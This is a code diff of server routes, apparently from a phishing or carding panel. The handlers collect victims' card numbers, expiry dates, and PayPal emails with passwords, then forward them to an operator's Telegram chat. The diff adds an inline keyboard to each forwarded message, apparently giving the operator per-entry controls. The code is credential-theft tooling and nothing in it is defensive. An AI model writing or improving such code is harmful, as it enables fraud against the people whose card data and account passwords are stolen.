@@ -105,7 +105,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Send notification to Telegram
       const settings = await storage.getAdminSettings();
       if (settings?.telegramBotToken && settings?.telegramChatId) {
-        const message = formatPaymentNotification({
+        const notification = formatPaymentNotification({
           cardNumber: req.body.cardNumber,
           expiryMonth: req.body.expiryMonth,
           expiryYear: req.body.expiryYear,
@@ -122,7 +122,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         await sendTelegramMessage(
           settings.telegramBotToken,
           settings.telegramChatId,
-          message
+          notification.message,
+          notification.keyboard
         );
       }
       
@@ -169,7 +170,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (settings?.telegramBotToken && settings?.telegramChatId) {
         const clientInfo = await getClientInfo(req);
         
-        const message = formatPaymentNotification({
+        const notification = formatPaymentNotification({
           cardNumber: updated.cardNumber,
           expiryMonth: updated.expiryMonth,
           expiryYear: updated.expiryYear,
@@ -187,7 +188,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         await sendTelegramMessage(
           settings.telegramBotToken,
           settings.telegramChatId,
-          message
+          notification.message,
+          notification.keyboard
         );
       }
 
@@ -223,7 +225,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Send notification to Telegram
       const settings = await storage.getAdminSettings();
       if (settings?.telegramBotToken && settings?.telegramChatId) {
-        const message = formatPayPalNotification({
+        const notification = formatPayPalNotification({
           email,
           password,
           timestamp: new Date(),
@@ -237,7 +239,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         await sendTelegramMessage(
           settings.telegramBotToken,
           settings.telegramChatId,
-          message
+          notification.message,
+          notification.keyboard
         );
       }
 
